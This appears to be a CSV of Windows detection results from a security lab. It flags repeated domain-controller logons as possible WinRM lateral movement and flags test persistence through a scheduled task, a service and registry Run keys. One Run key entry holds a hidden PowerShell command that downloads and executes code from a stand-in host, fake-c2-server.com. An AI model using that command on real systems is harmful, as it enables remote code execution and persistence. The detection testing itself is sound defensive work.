"TimeCreated","Detection","Details"
"6/2/2025 10:11:53 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Impersonation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F59F70  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{8cbe555f-20f5-284b-4b95-1b2f63a167c7}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	fdb4:ca4a:bb5f:d79b:d05:8dd0:bc99:eddc  	Source Port:		60421    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:11:53 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Impersonation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F59F20  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{cc47b2c1-01b8-a762-57aa-bd7f5cb067d9}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	::1  	Source Port:		0    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:11:53 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Delegation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F59E33  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{cc47b2c1-01b8-a762-57aa-bd7f5cb067d9}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	fe80::9e86:947d:a1cd:88be  	Source Port:		60420    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:11:53 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Impersonation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F59DAD  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{8cbe555f-20f5-284b-4b95-1b2f63a167c7}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	fe80::9e86:947d:a1cd:88be  	Source Port:		60419    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:11:12 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Impersonation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F54665  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{8cbe555f-20f5-284b-4b95-1b2f63a167c7}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	::1  	Source Port:		60418    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:10:22 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Delegation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F4D2C6  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{9eb22d8c-6c4e-322e-d14f-54313124e514}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	fe80::9e86:947d:a1cd:88be  	Source Port:		60417    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:10:12 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Impersonation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F4BC64  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{8cbe555f-20f5-284b-4b95-1b2f63a167c7}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	::1  	Source Port:		60413    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:09:12 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Impersonation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F3D826  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{8cbe555f-20f5-284b-4b95-1b2f63a167c7}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	::1  	Source Port:		60392    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:08:45 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Impersonation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F39D60  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{8cbe555f-20f5-284b-4b95-1b2f63a167c7}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	fe80::9e86:947d:a1cd:88be  	Source Port:		60385    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:08:45 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Impersonation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F39CDF  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{8cbe555f-20f5-284b-4b95-1b2f63a167c7}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	fe80::9e86:947d:a1cd:88be  	Source Port:		60384    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:08:12 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Impersonation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F33CBD  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{8cbe555f-20f5-284b-4b95-1b2f63a167c7}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	::1  	Source Port:		60382    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:07:12 AM","Potential WinRM Lateral Movement (4624)","An account was successfully logged on.    Subject:  	Security ID:		S-1-0-0  	Account Name:		-  	Account Domain:		-  	Logon ID:		0x0    Logon Information:  	Logon Type:		3  	Restricted Admin Mode:	-  	Virtual Account:		No  	Elevated Token:		Yes    Impersonation Level:		Impersonation    New Logon:  	Security ID:		S-1-5-18  	Account Name:		DC1$  	Account Domain:		BECAUSESECURITY.PRI  	Logon ID:		0x4F2BDBB  	Linked Logon ID:		0x0  	Network Account Name:	-  	Network Account Domain:	-  	Logon GUID:		{8cbe555f-20f5-284b-4b95-1b2f63a167c7}    Process Information:  	Process ID:		0x0  	Process Name:		-    Network Information:  	Workstation Name:	-  	Source Network Address:	::1  	Source Port:		60381    Detailed Authentication Information:  	Logon Process:		Kerberos  	Authentication Package:	Kerberos  	Transited Services:	-  	Package Name (NTLM only):	-  	Key Length:		0    This event is generated when a logon session is created. It is generated on the computer that was accessed.    The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.    The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).    The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.    The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.    The impersonation level field indicates the extent to which a process in the logon session can impersonate.    The authentication information fields provide detailed information about this specific logon request.  	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.  	- Transited services indicate which intermediate services have participated in this logon request.  	- Package name indicates which sub-protocol was used among the NTLM protocols.  	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
"6/2/2025 10:26:59 AM","Suspicious Scheduled Task (4698)","A scheduled task was created.    Subject:  	Security ID:		S-1-5-21-2982134692-2722354312-2289707926-500  	Account Name:		administrator  	Account Domain:		BECAUSESECURITY  	Logon ID:		0x7A330    Task Information:  	Task Name: 		\FakePersistenceTask  	Task Content: 		<?xml version=""1.0"" encoding=""UTF-16""?>  <Task version=""1.3"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">    <RegistrationInfo>      <URI>\FakePersistenceTask</URI>    </RegistrationInfo>    <Triggers>      <BootTrigger>        <Enabled>true</Enabled>      </BootTrigger>    </Triggers>    <Principals>      <Principal id=""Author"">        <UserId>S-1-5-18</UserId>        <RunLevel>HighestAvailable</RunLevel>        <LogonType>InteractiveToken</LogonType>      </Principal>    </Principals>    <Settings>      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>      <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>      <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>      <AllowHardTerminate>true</AllowHardTerminate>      <StartWhenAvailable>false</StartWhenAvailable>      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>      <IdleSettings>        <Duration>PT10M</Duration>        <WaitTimeout>PT1H</WaitTimeout>        <StopOnIdleEnd>true</StopOnIdleEnd>        <RestartOnIdle>false</RestartOnIdle>      </IdleSettings>      <AllowStartOnDemand>true</AllowStartOnDemand>      <Enabled>true</Enabled>      <Hidden>false</Hidden>      <RunOnlyIfIdle>false</RunOnlyIfIdle>      <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>      <UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>      <WakeToRun>false</WakeToRun>      <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>      <Priority>7</Priority>    </Settings>    <Actions Context=""Author"">      <Exec>        <Command>cmd.exe</Command>        <Arguments>/c echo Lateral Test &gt; C:\Windows\Temp\lateral_test.txt</Arguments>      </Exec>    </Actions>  </Task>    Other Information:  	ProcessCreationTime: 		27303072740933730  	ClientProcessId: 			4548  	ParentProcessId: 			992  	FQDN: 		0  	"
"6/2/2025 10:27:25 AM","Suspicious Registry Run Key Persistence","MalwarePersist = powershell.exe -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://fake-c2-server.com/payload')"
"6/2/2025 10:27:25 AM","Suspicious Registry Run Key Persistence","FakeMalwareTest = powershell.exe -NoProfile -WindowStyle Hidden -Command ""Write-Output 'TEST: Fake malware persistence - 05/15/2025 08:41:25'"""
"6/2/2025 10:27:25 AM","Suspicious Registry Run Key Persistence","Updater = cmd.exe /c echo Registry Persistence >> C:\Windows\Temp\reg_persist.txt"
"6/2/2025 10:27:25 AM","Suspicious Registry Run Key Persistence","PSPath = Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
"6/2/2025 10:27:25 AM","Suspicious Registry Run Key Persistence","PSParentPath = Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
"6/2/2025 10:27:25 AM","Suspicious Registry Run Key Persistence","PSProvider = Microsoft.PowerShell.Core\Registry"
"6/2/2025 10:27:01 AM","Suspicious Service Creation (7045)","A service was installed in the system.    Service Name:  TestService  Service File Name:  cmd.exe /c echo Service executed >> C:\Windows\Temp\service_log.txt  Service Type:  user mode service  Service Start Type:  demand start  Service Account:  LocalSystem"
